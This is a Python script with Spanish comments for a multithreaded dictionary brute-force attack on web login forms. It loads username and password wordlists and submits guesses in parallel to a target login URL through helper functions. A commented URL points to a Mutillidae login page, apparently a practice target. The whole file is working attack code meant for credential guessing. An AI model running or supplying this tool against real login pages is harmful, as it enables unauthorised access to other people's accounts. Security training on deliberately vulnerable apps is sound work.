import parametros as params
import func
from concurrent.futures import ThreadPoolExecutor
from colorama import init,Fore
from mechanize import HTTPError
from time import sleep

init()
#IMPORTANTE: TENGO QUE OPTIMIZAR LAS LISTAS PORQUE CONSUME MUCHA RAM    

#http://128.198.49.198:8102/mutillidae/index.php?page=login.php

try:
    
    # parametros utilizados por defecto
    if params.param.c_u != None:
        c_usuario = params.param.c_u
    else:
        c_usuario = 'username'

    if params.param.c_c != None:

        c_contraseña = params.param.c_c
    else:
        c_contraseña = 'password'

    if params.param.n != None:
        n = params.param.n
    else:
        n = 0

    if params.param.hilos != None:
        if params.param.hilos <= 16:
            hilo = params.param.hilos
        else:
            print(Fore.YELLOW+'cantidad de hilos mayor a 16 no es recomendable')
            hilo = 16
    else:
        hilo = 16
    #-------------------------------------


    #conozco el usuario
    if params.param.usuario != None and params.param.dic_u == None:
        
        dic_cont= func.leer_dic(params.param.dic_c)
        
        lista = dic_cont.split()
        
        with ThreadPoolExecutor(max_workers=hilo) as ejec:
            for cont in reversed(lista):
                try:
                    if not func.deteniendo:
                        ejec.submit(func.fb,url_login=params.param.url,usuario=params.param.usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                        lista.remove(cont) 

                    else:
                        ejec.shutdown(wait=False,cancel_futures=True)
                        break
                except HTTPError:
                    print(Fore.WHITE+'reconectando...')
                    sleep(1)
                    continue
                
               
    #no conozco el usuario 
    elif params.param.dic_u != None and params.param.usuario == None:
        try:
    
            dic_usuario = func.leer_dic(params.param.dic_u).split()
            
            print(f'hilos: {hilo}')
            with ThreadPoolExecutor(max_workers=hilo) as ejec:
                for usuario  in reversed(sorted(dic_usuario)):

                    dic_contr= func.generador(params.param.dic_c)

                    for cont  in dic_contr:
                        if not func.deteniendo:

                            ejec.submit(func.fb,url_login=params.param.url,usuario=usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                        else:
                            ejec.shutdown(wait=False,cancel_futures=True)
                            break
                    dic_usuario.remove(usuario)    
        except Exception as e:
            print(Fore.RED+f'hubo un error: {e}')

except KeyboardInterrupt:
    
    exit()


